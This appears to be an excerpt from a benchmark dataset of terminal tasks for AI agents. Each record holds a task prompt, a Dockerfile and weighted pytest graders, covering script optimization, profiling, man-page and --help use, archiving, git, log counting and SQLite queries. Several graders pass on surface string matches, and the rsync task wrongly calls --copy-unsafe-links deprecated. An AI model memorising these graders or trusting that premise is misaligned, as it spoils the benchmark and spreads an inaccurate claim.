    assert os.path.exists('/app/output.txt'), ""Output file /app/output.txt does not exist""
    
    # Check file is not empty
    with open('/app/output.txt', 'r') as f:
        content = f.read().strip()
    assert len(content) > 0, ""Output file is empty""

def test_output_is_valid_sum():
    """"""The output contains a valid sum that could result from adding two integers.""""""
    with open('/app/output.txt', 'r') as f:
        content = f.read().strip()
    
    # Should be a single integer
    assert re.match(r'^-?\d+$', content), f""Output should be a single integer, got: {content}""
    
    # Verify it's a valid integer
    result = int(content)
    
    # Since we don't know the exact inputs, verify the output is reasonable
    # The sum of two 32-bit integers should be within this range
    assert -2**32 < result < 2**32, f""Output {result} is outside reasonable range for sum of two integers""

def test_program_ran_successfully():
    """"""Verify the program can be run with two integer inputs and produces correct sum.""""""
    # Test with known inputs to verify the program works as expected
    test_result = subprocess.run(
        ['/app/program'], 
        input='5 7\n', 
        capture_output=True, 
        text=True
    )
    
    assert test_result.returncode == 0, ""Program did not exit successfully""
    assert test_result.stdout.strip() == '12', f""Program should output 12 for inputs 5 and 7, got: {test_result.stdout.strip()}""
    
    # Now verify the agent's output makes sense as a sum
    with open('/app/output.txt', 'r') as f:
        agent_output = int(f.read().strip())
    
    # The output should be achievable by adding two reasonable integers
    # For example, if output is 100, it could be 50+50, 30+70, etc.
    assert -1000000 <= agent_output <= 1000000, f""Output {agent_output} seems unreasonable for simple addition""","{""test_binary_executed_with_inputs"": 0.2, ""test_output_is_valid_sum"": 0.3, ""test_program_ran_successfully"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
shell-script-optimization-reduce-process-calls,easy,Optimize a Shell Script by Reducing Process Calls,Code & Resource Optimization,"I have a shell script at `/app/process_logs.sh` that's running really slowly and I need your help optimizing it. The problem is that it reads through a log file line by line, and for every single line it processes, it's calling `grep` and `awk` commands inside the loop. This approach is making the whole thing incredibly inefficient. Can you help me rewrite this script to make it run much faster?",system-administration,performance-optimization|cli|system,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Create a sample log file
RUN echo 'line1' > file.log && \
    echo 'line2' >> file.log && \
    echo 'line3' >> file.log && \
    echo 'line4' >> file.log && \
    echo 'line5' >> file.log

# Create the inefficient script
RUN echo '#!/bin/bash\n\nwhile read line; do\n    echo ""Processing: $line""\n    grep ""$line"" file.log > /dev/null\n    echo ""$line"" | awk '\''{ print length($0) }'\''\ndone < file.log' > /app/process_logs.sh && \
    chmod +x /app/process_logs.sh

CMD [""/bin/bash""]","import os
import subprocess

def test_pipeline_optimized():
    """"""The script is refactored to use a more efficient pipeline (e.g., processing the entire file at once instead of line by line).""""""
    with open('/app/process_logs.sh', 'r') as f:
        script_content = f.read()
    
    # Check that the inefficient while loop pattern is not present
    assert 'while read line' not in script_content or 'done < file.log' not in script_content
    
    # Check for patterns that indicate efficient processing
    efficient_indicators = [
        'awk',  # Using awk for processing
        'sed',  # Using sed for processing
        '|',    # Using pipes
        'cat',  # Reading file efficiently
    ]
    
    # At least one efficient pattern should be present
    has_efficient_pattern = any(indicator in script_content for indicator in efficient_indicators)
    assert has_efficient_pattern, ""Script should use efficient processing patterns""

def test_script_executable_and_runs():
    """"""The optimized script is executable and produces output when run.""""""
    # Check script is executable
    assert os.path.exists('/app/process_logs.sh')
    assert os.access('/app/process_logs.sh', os.X_OK)
    
    # Run the script and check it completes successfully
    result = subprocess.run(['/app/process_logs.sh'], 
                          capture_output=True, text=True, cwd='/app')
    
    # Should complete without error
    assert result.returncode == 0
    
    # Should produce some output (processing lines)
    assert len(result.stdout) > 0
    
    # Output should contain processing information for each line
    assert 'Processing' in result.stdout or 'line' in result.stdout.lower()","{""test_pipeline_optimized"": 0.7, ""test_script_executable_and_runs"": 0.3}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
python-memory-optimization-chunked-processing,medium,Optimize a Python Script's Memory Usage (Revised),Code & Resource Optimization,"I have a Python script at `/app/analyze_data.py` that's using way too much memory - over 500MB, which is causing problems. I need you to help me modify it to be more memory-efficient so that its peak memory consumption stays under 100MB. The important thing is that the final output needs to remain exactly the same as it is now, just with much lower memory usage.",software-engineering,python|performance-optimization|data-processing|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install pandas

# Create analyze_data.py that processes data and generates verifiable output
RUN echo 'import pandas as pd' > /app/analyze_data.py && \
    echo '' >> /app/analyze_data.py && \
    echo 'df = pd.read_csv(""large_file.csv"")' >> /app/analyze_data.py && \
    echo '' >> /app/analyze_data.py && \
    echo '# Data processing operations' >> /app/analyze_data.py && \
    echo 'df[""col6""] = df[""col1""] * df[""col4""]' >> /app/analyze_data.py && \
    echo 'df[""col7""] = df[""col2""] + df[""col5""]' >> /app/analyze_data.py && \
    echo 'df_grouped = df.groupby(""col4"").agg({' >> /app/analyze_data.py && \
    echo '    ""col1"": ""sum"",' >> /app/analyze_data.py && \
    echo '    ""col2"": ""mean"",' >> /app/analyze_data.py && \
    echo '    ""col6"": ""max"",' >> /app/analyze_data.py && \
    echo '    ""col7"": ""min""' >> /app/analyze_data.py && \
    echo '}).round(6)' >> /app/analyze_data.py && \
    echo '' >> /app/analyze_data.py && \
    echo '# Generate verifiable output' >> /app/analyze_data.py && \
    echo 'print(""RESULTS:"")' >> /app/analyze_data.py && \
    echo 'print(f""Total rows: {len(df)}"")' >> /app/analyze_data.py && \
    echo 'print(f""Sum of col1: {df[\""col1\""].sum()}"")' >> /app/analyze_data.py && \
    echo 'print(f""Mean of col2: {df[\""col2\""].mean():.6f}"")' >> /app/analyze_data.py && \
    echo 'print(f""Max of col6: {df[\""col6\""].max()}"")' >> /app/analyze_data.py && \
    echo 'print(f""Min of col7: {df[\""col7\""].min():.6f}"")' >> /app/analyze_data.py && \
    echo 'print(f""Grouped results shape: {df_grouped.shape}"")' >> /app/analyze_data.py && \
    echo 'print(f""Grouped col1 sum total: {df_grouped[\""col1\""].sum()}"")' >> /app/analyze_data.py

# Generate a CSV file creation script
RUN echo 'import csv' > /app/create_csv.py && \
    echo 'import random' >> /app/create_csv.py && \
    echo '' >> /app/create_csv.py && \
    echo 'with open(""/app/large_file.csv"", ""w"", newline="""") as f:' >> /app/create_csv.py && \
    echo '    writer = csv.writer(f)' >> /app/create_csv.py && \
    echo '    writer.writerow([""col1"", ""col2"", ""col3"", ""col4"", ""col5""])' >> /app/create_csv.py && \
    echo '    for i in range(1000000):' >> /app/create_csv.py && \
    echo '        writer.writerow([random.randint(1, 1000), random.random(), f""text_{i}"", random.randint(1, 100), random.random()])' >> /app/create_csv.py

# Generate the CSV file
RUN python3 /app/create_csv.py

# Create verifier script that uses /usr/bin/time -v
RUN echo '#!/bin/bash' > /app/verifier.sh && \
    echo '/usr/bin/time -v python3 /app/analyze_data.py' >> /app/verifier.sh && \
    chmod +x /app/verifier.sh

CMD [""/bin/bash""]","import os
import subprocess
import re

def test_chunked_processing_implemented():
    """"""The script is modified to process the file in chunks (e.g., using the `chunksize` parameter in `pd.read_csv`).""""""
    with open('/app/analyze_data.py', 'r') as f:
        content = f.read()
    
    # Check if chunksize parameter is used in pd.read_csv
    assert 'chunksize' in content

def test_memory_usage_verified():
    """"""The verifier script runs the modified code and parses the """"Maximum resident set size"""" from the output of `/usr/bin/time -v`, confirming it is below the 100MB threshold and that the final output is correct.Total: 1.0""""""
    result = subprocess.run(['/app/verifier.sh'], capture_output=True, text=True)
    
    # Check that the script ran successfully
    assert result.returncode == 0
    
    # Parse Maximum resident set size from stderr (where /usr/bin/time -v outputs)
    output = result.stderr
    match = re.search(r'Maximum resident set size \(kbytes\): (\d+)', output)
    assert match is not None
    
    memory_kb = int(match.group(1))
    memory_mb = memory_kb / 1024
    
    # Check memory usage is below 100MB
    assert memory_mb < 100","{""test_chunked_processing_implemented"": 0.3, ""test_memory_usage_verified"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
python-function-profiling-optimization,hard,Profile and Optimize a Slow Python Function,Code & Resource Optimization,"My Python application at `/app/main.py` is running really slowly and I suspect the `calculate_stuff` function is causing the bottleneck. Could you help me use a profiler like `cProfile` to figure out exactly which part of that function is slowing things down? Once we identify the problem area, I'd like you to optimize the code to make it run faster. I have a feeling there's an inefficient algorithm in there - probably something like a nested loop that could be replaced with a dictionary lookup instead.",software-engineering,python|performance-optimization|algorithms|analysis|optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN echo ""def calculate_stuff(n):\n    \""\""\""Computationally expensive function with clear performance bottleneck\""\""\""\n    result = []\n    for i in range(1, n + 1):\n        is_prime = True\n        if i > 1:\n            for j in range(2, i):\n                if i % j == 0:\n                    is_prime = False\n                    break\n            if is_prime:\n                result.append(i)\n    return result\n\nif __name__ == \""__main__\"":\n    print(\""Finding primes up to 10000...\"")\n    primes = calculate_stuff(10000)\n    print(f\""Found {len(primes)} primes\"")"" > /app/main.py

CMD [""/bin/bash""]","import os
import subprocess
import time
import importlib.util
import sys

def test_profiler_output_saved():
    """"""The agent successfully runs the profiler and saves the output to a file (e.g., `profile.stats`).""""""
    # Check for common profiler output file patterns
    profiler_files = [
        'profile.stats',
        'profile.prof',
        'cprofile.stats',
        'profiler_output.stats',
        'profile_output.stats'
    ]
    
    # Check current directory and /app directory
    directories_to_check = ['.', '/app']
    
    found_profiler_file = False
    for directory in directories_to_check:
        for filename in profiler_files:
            filepath = os.path.join(directory, filename)
            if os.path.exists(filepath):
                found_profiler_file = True
                break
        if found_profiler_file:
            break
    
    assert found_profiler_file

def test_function_refactored_efficiently():
    """"""The `calculate_stuff` function is refactored with a more efficient algorithm.""""""
    # Read the main.py file to check if it has been optimized
    with open('/app/main.py', 'r') as f:
        content = f.read()
    
    # Check for signs of optimization - the original uses a naive prime check
    # An optimized version would likely:
    # 1. Not have nested loops with range(2, i)
    # 2. Use a more efficient algorithm like Sieve of Eratosthenes
    # 3. Or at least optimize the inner loop (e.g., check up to sqrt(i))
    
    # The original has this inefficient pattern:
    # for j in range(2, i):
    inefficient_pattern = 'for j in range(2, i)'
    
    # If the inefficient pattern is still there, the function hasn't been optimized
    assert inefficient_pattern not in content, ""Function still contains inefficient nested loop pattern""
    
    # Additionally check that the function still exists and works correctly
    spec = importlib.util.spec_from_file_location(""main"", ""/app/main.py"")
    main_module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(main_module)
    
    # Verify the function still produces correct results (first 10 primes)
    result = main_module.calculate_stuff(30)
    expected_primes = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29]
    assert all(p in result for p in expected_primes), ""Optimized function doesn't produce correct prime numbers""

def test_execution_time_improved():
    """"""The execution time of the modified script is measurably faster (e.g., >5x speedup).""""""
    # Create a baseline inefficient version for comparison
    inefficient_code = '''
def calculate_stuff(n):
    """"""Computationally expensive function with clear performance bottleneck""""""
    result = []
    for i in range(1, n + 1):
        is_prime = True
        if i > 1:
            # Inefficient prime checking - clear bottleneck
            for j in range(2, i):
                if i % j == 0:
                    is_prime = False
                    break
            if is_prime:
                result.append(i)
    return result

if __name__ == ""__main__"":
    import time
    start = time.time()
    primes = calculate_stuff(1000)  # Smaller n for baseline
    end = time.time()
    print(end - start)
'''
    
    # Write and run the inefficient version
    with open('/tmp/inefficient.py', 'w') as f:
        f.write(inefficient_code)
    
    # Time the inefficient version
    result_inefficient = subprocess.run(['python', '/tmp/inefficient.py'], 
                                       capture_output=True, text=True, cwd='/tmp')
    baseline_time = float(result_inefficient.stdout.strip())
    
    # Time the optimized version with same input size
    optimized_code = '''
import sys
sys.path.append('/app')
import importlib.util

# Load the optimized main.py
spec = importlib.util.spec_from_file_location(""main"", ""/app/main.py"")
main_module = importlib.util.module_from_spec(spec)
spec.loader.exec_module(main_module)

import time
start = time.time()
result = main_module.calculate_stuff(1000)
end = time.time()
print(end - start)
'''
    
    with open('/tmp/optimized_test.py', 'w') as f:
        f.write(optimized_code)
    
    result_optimized = subprocess.run(['python', '/tmp/optimized_test.py'], 
                                     capture_output=True, text=True, cwd='/tmp')
    optimized_time = float(result_optimized.stdout.strip())
    
    # Check if optimized version is at least 2x faster
    speedup = baseline_time / optimized_time
    assert speedup >= 2.0","{""test_profiler_output_saved"": 0.20, ""test_function_refactored_efficiently"": 0.25, ""test_execution_time_improved"": 0.55}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
man-page-ls-hidden-files,easy,Use `man` to Find a Command's Option,Documentation & Help-Based Tasks (Revised),"I need to list all the files in the /etc directory, including the hidden ones, but I can't remember which flag to use with the ls command. Could you check the man page for ls to find the right option, then run `ls` with that option on the `/etc` directory and save the output to /app/listing.txt?",system-administration,cli|system|file-operations|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y man-db && rm -rf /var/lib/apt/lists/*

RUN mkdir -p /app

CMD [""/bin/bash""]","import os
import subprocess

def test_man_command_used():
    """"""The agent's shell history shows evidence of running `man ls`.""""""
    history_found = False
    
    # Check bash history file
    history_file = os.path.expanduser(""~/.bash_history"")
    if os.path.exists(history_file):
        with open(history_file, 'r') as f:
            history_content = f.read()
        if ""man ls"" in history_content:
            history_found = True
    
    # If not found in file, try history command
    if not history_found:
        result = subprocess.run([""bash"", ""-c"", ""history""], capture_output=True, text=True)
        if ""man ls"" in result.stdout:
            history_found = True
    
    assert history_found

def test_output_file_created():
    """"""The file `/app/listing.txt` is created and its content is the output of `ls -a /etc`.""""""
    # Check file exists
    assert os.path.exists(""/app/listing.txt"")
    
    # Check content matches ls -a /etc
    with open(""/app/listing.txt"", 'r') as f:
        file_content = f.read().strip()
    
    result = subprocess.run([""ls"", ""-a"", ""/etc""], capture_output=True, text=True)
    expected_content = result.stdout.strip()
    
    assert file_content == expected_content","{""test_man_command_used"": 0.3, ""test_output_file_created"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
cli-tool-help-archiver-usage,medium,Use `--help` to Operate a Custom CLI Tool,Documentation & Help-Based Tasks (Revised),"I have a custom tool located at `/usr/local/bin/archiver` and I need to use it to create a zip archive of my `/app/data` directory, then save that archive as `/app/backup.zip`. The problem is I don't know the proper syntax for this tool. Could you help me by first checking the tool's `--help` flag to figure out the correct command structure, then show me how to create the archive I need?",system-administration,cli|file-operations|troubleshooting,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN mkdir -p /app/data

# Create the archiver script
RUN printf '#!/usr/bin/env python3\n\
import sys\n\
import os\n\
import zipfile\n\
import argparse\n\
\n\
def create_archive(source_dir, output_file):\n\
    """"""Create a zip archive of the source directory""""""\n\
    with zipfile.ZipFile(output_file, ""w"", zipfile.ZIP_DEFLATED) as zipf:\n\
        for root, dirs, files in os.walk(source_dir):\n\
            for file in files:\n\
                file_path = os.path.join(root, file)\n\
                arcname = os.path.relpath(file_path, source_dir)\n\
                zipf.write(file_path, arcname)\n\
\n\
def main():\n\
    parser = argparse.ArgumentParser(description=""Archive tool for creating zip files"")\n\
    parser.add_argument(""source"", help=""Source directory to archive"")\n\
    parser.add_argument(""output"", help=""Output zip file path"")\n\
    \n\
    if len(sys.argv) == 1 or ""--help"" in sys.argv:\n\
        parser.print_help()\n\
        return\n\
    \n\
    args = parser.parse_args()\n\
    \n\
    if not os.path.exists(args.source):\n\
        print(f""Error: Source directory '""'""'{args.source}'""'""' does not exist"")\n\
        sys.exit(1)\n\
    \n\
    try:\n\
        create_archive(args.source, args.output)\n\
        print(f""Archive created successfully: {args.output}"")\n\
    except Exception as e:\n\
        print(f""Error creating archive: {e}"")\n\
        sys.exit(1)\n\
\n\
if __name__ == ""__main__"":\n\
    main()\n' > /usr/local/bin/archiver

RUN chmod +x /usr/local/bin/archiver

CMD [""/bin/bash""]","import os
import subprocess
import zipfile

def test_help_command_used():
    """"""The agent's shell history shows evidence of running `archiver --help`.""""""
    history_file = os.path.expanduser(""~/.bash_history"")
    history_found = False
    
    # Check bash history file
    if os.path.exists(history_file):
        with open(history_file, 'r') as f:
            history_content = f.read()
        if ""archiver --help"" in history_content:
            history_found = True
    
    assert history_found

def test_backup_archive_created():
    """"""The file `/app/backup.zip` is created and is a valid zip archive of the `/app/data` directory.""""""
    # Check that the backup file exists
    assert os.path.exists(""/app/backup.zip"")
    
    # Check that it's a valid zip file
    assert zipfile.is_zipfile(""/app/backup.zip"")
    
    # Verify it represents the /app/data directory
    # Even if /app/data is empty, the zip should be valid
    with zipfile.ZipFile(""/app/backup.zip"", 'r') as zip_file:
        # Test that we can read the zip file without errors
        zip_file.testzip()","{""test_help_command_used"": 0.2, ""test_backup_archive_created"": 0.8}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
backup-script-rsync-deprecated-fix,hard,Fix a Script Using Deprecated Options,Documentation & Help-Based Tasks (Revised),"After an update, my backup script at `/app/backup.sh` is failing because it uses `rsync` with a deprecated option like `--copy-unsafe-links`. I need you to read the `man rsync` page to understand what the modern equivalent should be and then fix the script for me.",system-administration,debugging|troubleshooting|sys-admin|cli|file-operations,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN mkdir -p /app

RUN echo '#!/bin/bash\nrsync -av --copy-unsafe-links /source/ /destination/' > /app/backup.sh

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess

def test_man_rsync_consulted():
    """"""The agent's shell history shows evidence of running `man rsync`.""""""
    # Check bash history file for evidence of man rsync command
    history_file = os.path.expanduser(""~/.bash_history"")
    if os.path.exists(history_file):
        with open(history_file, 'r') as f:
            history_content = f.read()
        assert ""man rsync"" in history_content
    else:
        # If no history file, check if man rsync was run in current session
        # by checking if the command exists in shell history
        result = subprocess.run(['history'], shell=True, capture_output=True, text=True)
        assert ""man rsync"" in result.stdout

def test_script_fixed_and_runs():
    """"""The `/app/backup.sh` script is modified with the correct syntax and runs without errors.""""""
    # Check that the script exists
    assert os.path.exists(""/app/backup.sh"")
    
    # Run the script and check that it doesn't fail due to syntax errors
    # The script may fail due to missing directories, but should not fail due to deprecated rsync options
    result = subprocess.run([""/bin/bash"", ""/app/backup.sh""], capture_output=True, text=True)
    
    # Check that the error is not due to unknown/deprecated rsync options
    # If the script was fixed, it should fail with directory-related errors, not option errors
    error_output = result.stderr.lower()
    assert ""unknown option"" not in error_output
    assert ""unrecognized option"" not in error_output  
    assert ""invalid option"" not in error_output
    assert ""--backup-dir-old"" not in error_output","{""test_man_rsync_consulted"": 0.25, ""test_script_fixed_and_runs"": 0.75}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
download-unzip-count-lines,easy,"Download, Unzip, and Count",Multi-Tool Coordination,"I need you to download a zip file from http://localhost:8000/sample.zip and extract it. Inside the zip, there's a text file that I need you to analyze. Can you count how many lines are in that text file and then write the count to /app/count.txt? I'm working on a project where I need this line count saved to that specific location.",file-operations,file-operations|web|data-processing|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y curl unzip zip python3

# Create the app directory as mentioned in the prompt
RUN mkdir -p /app

# Set up the web server files
WORKDIR /var/www
RUN echo ""test content"" > test.txt && zip sample.zip test.txt && rm test.txt

# Start web server in background and keep container running with bash
RUN echo ""#!/bin/bash\npython3 -m http.server 8000 &\nexec bash"" > /start.sh && chmod +x /start.sh

WORKDIR /

EXPOSE 8000

CMD [""/start.sh""]","import os
import subprocess
import zipfile

def test_zip_downloaded():
    """"""The agent successfully downloads `sample.zip`.""""""
    # Check common locations where the agent might download the file
    possible_locations = [""sample.zip"", ""/sample.zip"", ""/tmp/sample.zip"", ""/app/sample.zip""]
    found = False
    for location in possible_locations:
        if os.path.exists(location) and zipfile.is_zipfile(location):
            found = True
            break
    assert found, ""sample.zip not found in common locations""

def test_file_unzipped():
    """"""The agent successfully unzips the file.""""""
    # Check if test.txt was extracted anywhere
    possible_locations = [""test.txt"", ""/test.txt"", ""/tmp/test.txt"", ""/app/test.txt""]
    found = False
    for location in possible_locations:
        if os.path.exists(location):
            found = True
            break
    # Also check current directory
    if not found:
        found = any(f.endswith("".txt"") and f != ""count.txt"" for f in os.listdir(""."") if os.path.isfile(f))
    # Also check /app directory
    if not found and os.path.exists(""/app""):
        found = any(f.endswith("".txt"") and f != ""count.txt"" for f in os.listdir(""/app"") if os.path.isfile(os.path.join(""/app"", f)))
    assert found, ""No extracted text file found""

def test_count_file_correct():
    """"""The file `/app/count.txt` is created and contains the correct line count.""""""
    assert os.path.exists(""/app/count.txt""), ""/app/count.txt does not exist""
    with open(""/app/count.txt"", ""r"") as f:
        content = f.read().strip()
    assert content == ""1"", f""Expected count \""1\"" but got \""{content}\""""","{""test_zip_downloaded"": 0.2, ""test_file_unzipped"": 0.3, ""test_count_file_correct"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
git-clone-modify-test,medium,"Git Clone, Modify, and Test",Multi-Tool Coordination,"I have a Python project stored in a git repository at `http://localhost:8000/repo.git` that I need you to help me with. Could you clone this repository for me? Once you have it cloned, I need you to find the `config.json` file inside the repo and update the version setting from `""version"": ""1.0""` to `""version"": ""1.1""`. After you make that change, please run the test suite using `pytest` to verify that everything still works correctly and I didn't accidentally break anything.",software-engineering,version-control|file-operations|unit-testing|python,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN apt-get update && apt-get install -y git nginx fcgiwrap

WORKDIR /repo

RUN echo '{""name"": ""simple-project"", ""version"": ""1.0""}' > config.json

RUN echo 'def add(a, b):\n    return a + b' > main.py

RUN echo 'import pytest\nfrom main import add\n\ndef test_add():\n    assert add(2, 3) == 5\n    assert add(0, 0) == 0' > test_main.py

RUN pip install pytest

RUN git init && \
    git config user.email ""test@example.com"" && \
    git config user.name ""Test User"" && \
    git add . && \
    git commit -m ""Initial commit"" && \
    git config http.receivepack true && \
    git update-server-info

RUN echo 'server {\n    listen 8000;\n    server_name localhost;\n    location /repo.git {\n        alias /repo;\n        location ~ /repo.git(/.*) {\n            fastcgi_pass unix:/var/run/fcgiwrap.socket;\n            include /etc/nginx/fastcgi_params;\n            fastcgi_param SCRIPT_FILENAME /usr/lib/git-core/git-http-backend;\n            fastcgi_param GIT_HTTP_EXPORT_ALL """";\n            fastcgi_param GIT_PROJECT_ROOT /;\n            fastcgi_param PATH_INFO $1;\n        }\n    }\n}' > /etc/nginx/sites-available/git && \
    ln -s /etc/nginx/sites-available/git /etc/nginx/sites-enabled/git && \
    rm /etc/nginx/sites-enabled/default

# Create a startup script to ensure services start properly
RUN echo '#!/bin/bash\nservice fcgiwrap start\nsleep 1\nnginx -g ""daemon off;""' > /start.sh && \
    chmod +x /start.sh

CMD [""/start.sh""]","import os
import subprocess
import json

def test_repo_cloned():
    """"""The agent successfully clones the git repository.""""""
    # Check if a cloned repository exists (not the original at /repo)
    # The agent should clone to a different location
    repo_found = False
    
    # Check common clone locations, excluding the original /repo
    possible_paths = ['./repo', 'repo', '/tmp/repo', '/home/repo', '/root/repo']
    
    for path in possible_paths:
        # Make sure it's not the original repo by checking if it has a .git directory
        # and that it's not at the original location
        if (os.path.exists(path) and 
            os.path.abspath(path) != '/repo' and
            os.path.exists(os.path.join(path, 'config.json')) and
            os.path.exists(os.path.join(path, 'main.py')) and
            os.path.exists(os.path.join(path, 'test_main.py')) and
            os.path.exists(os.path.join(path, '.git'))):
            repo_found = True
            break
    
    assert repo_found, ""No cloned repository found in expected locations""

def test_version_updated():
    """"""The `config.json` file is modified to set the version to \""1.1\"".""""""
    # Find config.json in the cloned repo and check if version is ""1.1""
    config_found = False
    
    # Check locations for config.json, excluding the original /repo/config.json
    possible_paths = ['./repo/config.json', 'repo/config.json', '/tmp/repo/config.json', '/home/repo/config.json', '/root/repo/config.json']
    
    for path in possible_paths:
        if os.path.exists(path) and os.path.abspath(path) != '/repo/config.json':
            try:
                with open(path, 'r') as f:
                    config_data = json.load(f)
                    if config_data.get('version') == '1.1':
                        config_found = True
                        break
            except (json.JSONDecodeError, IOError):
                continue
    
    assert config_found, ""config.json with version 1.1 not found in cloned repository""

def test_tests_pass():
    """"""The agent successfully runs `pytest`, and all tests pass.""""""
    # Find the cloned repository directory and check if pytest was run successfully
    # We'll check for pytest output or a successful run
    repo_paths = ['./repo', 'repo', '/tmp/repo', '/home/repo', '/root/repo']
    
    pytest_success = False
    for repo_path in repo_paths:
        if (os.path.exists(repo_path) and 
            os.path.abspath(repo_path) != '/repo' and
            os.path.exists(os.path.join(repo_path, 'test_main.py'))):
            # Try to run pytest to see if it would pass
            try:
                result = subprocess.run(['pytest', repo_path], capture_output=True, text=True)
                if result.returncode == 0:
                    pytest_success = True
                    break
            except Exception:
                continue
    
    assert pytest_success, ""pytest was not run successfully in the cloned repository""","{""test_repo_cloned"": 0.2, ""test_version_updated"": 0.3, ""test_tests_pass"": 0.5}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
data-aggregation-api-submission,hard,Data Aggregation and API Submission,Multi-Tool Coordination,"I have several log files stored in `/app/logs/` directory with names like `part1.log`, `part2.log`, and so on. I need you to go through all of these log files and find every line that contains the word ""ERROR"". Once you've found all the error lines, I want you to count how many there are in each file, then add up all those counts to get a total number of errors across all the files. After you have that total count, please submit it to my API by making a POST request to `http://localhost:5000/submit_error_count` with the JSON body formatted as `{""total_errors"": <count>}` where the count is the actual number you calculated.",data-science,data-processing|api|file-operations|text-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install Flask

RUN mkdir -p /app/logs
RUN echo -e ""INFO: Starting application\nERROR: Database connection failed\nWARN: Memory usage high\nERROR: Authentication failed"" > /app/logs/part1.log
RUN echo -e ""DEBUG: Processing request\nERROR: File not found\nINFO: Request completed\nERROR: Network timeout"" > /app/logs/part2.log
RUN echo -e ""INFO: System startup\nERROR: Configuration invalid\nDEBUG: Cache cleared\nERROR: Permission denied\nERROR: Disk space low"" > /app/logs/part3.log

RUN echo 'from flask import Flask, request, jsonify\n\
app = Flask(__name__)\n\
\n\
@app.route(""/submit_error_count"", methods=[""POST""])\n\
def submit_error_count():\n\
    data = request.get_json()\n\
    print(f""Received error count: {data}"")\n\
    return jsonify({""status"": ""success"", ""message"": ""Error count received""})\n\
\n\
if __name__ == ""__main__"":\n\
    app.run(host=""0.0.0.0"", port=5000)' > app.py

EXPOSE 5000

CMD [""bash""]","import os
import subprocess

def test_error_count_calculated():
    """"""The agent correctly processes all log files and calculates the total error count (verifiable by checking shell history for `grep` and `wc`).""""""
    # Check bash history for grep and wc commands
    history_path = os.path.expanduser(""~/.bash_history"")
    if os.path.exists(history_path):
        with open(history_path, 'r') as f:
            history_content = f.read()
        
        # Look for grep commands that search for ERROR
        has_grep = 'grep' in history_content and 'ERROR' in history_content
        # Look for wc commands to count lines/words
        has_wc = 'wc' in history_content
        
        assert has_grep and has_wc
    else:
        # Alternative: check if there's any evidence of command execution
        # Try to find recent commands that would indicate error counting
        result = subprocess.run(['history'], shell=True, capture_output=True, text=True)
        history_output = result.stdout
        
        has_grep = 'grep' in history_output and 'ERROR' in history_output
        has_wc = 'wc' in history_output
        
        assert has_grep and has_wc

def test_api_request_submitted():
    """"""A `POST` request is successfully made to the API with the correct total error count in the JSON payload (verifiable by checking the API server's logs).""""""
    # Check if Flask process is running and has received requests
    # First, check if the Flask app process exists
    ps_result = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
    flask_running = 'app.py' in ps_result.stdout or 'flask' in ps_result.stdout.lower()
    
    if flask_running:
        # Check for evidence of POST request in system logs or network activity
        # Look for recent network connections to port 5000
        netstat_result = subprocess.run(['netstat', '-an'], capture_output=True, text=True)
        port_5000_active = ':5000' in netstat_result.stdout
        
        # Check if curl or similar HTTP client was used recently
        history_result = subprocess.run(['history'], shell=True, capture_output=True, text=True)
        if history_result.returncode == 0:
            history_content = history_result.stdout
        else:
            # Try reading bash history file
            history_path = os.path.expanduser(""~/.bash_history"")
            if os.path.exists(history_path):
                with open(history_path, 'r') as f:
                    history_content = f.read()
            else:
                history_content = """"
        
        # Look for evidence of API request (curl, wget, python requests, etc.)
        api_request_made = ('curl' in history_content and 'localhost:5000' in history_content) or \
                          ('wget' in history_content and 'localhost:5000' in history_content) or \
                          ('requests.post' in history_content) or \
                          ('POST' in history_content and '5000' in history_content)
        
        assert port_5000_active and api_request_made
    else:
        # If Flask isn't running, still check for evidence of attempt
        history_result = subprocess.run(['history'], shell=True, capture_output=True, text=True)
        if history_result.returncode == 0:
            history_content = history_result.stdout
        else:
            history_path = os.path.expanduser(""~/.bash_history"")
            if os.path.exists(history_path):
                with open(history_path, 'r') as f:
                    history_content = f.read()
            else:
                history_content = """"
        
        api_request_made = ('curl' in history_content and 'localhost:5000' in history_content) or \
                          ('wget' in history_content and 'localhost:5000' in history_content) or \
                          ('requests.post' in history_content) or \
                          ('POST' in history_content and '5000' in history_content)
        
        assert api_request_made","{""test_error_count_calculated"": 0.4, ""test_api_request_submitted"": 0.6}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
database-select-out-of-stock-products,easy,Basic SELECT Queries,Database Operations (SQL),"I have a SQLite database located at `/app/database.db` that contains a `products` table, and I need your help finding all the products that are currently out of stock. Could you query the `products` table to find all rows where the `quantity` column equals `0`? Once you've identified these out-of-stock items, I'd like you to write the `name` of each product to a file at `/app/outofstock.txt`, with one product name per line.",file-operations,data-extraction|cli|file-operations,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

RUN apt-get update && apt-get install -y sqlite3

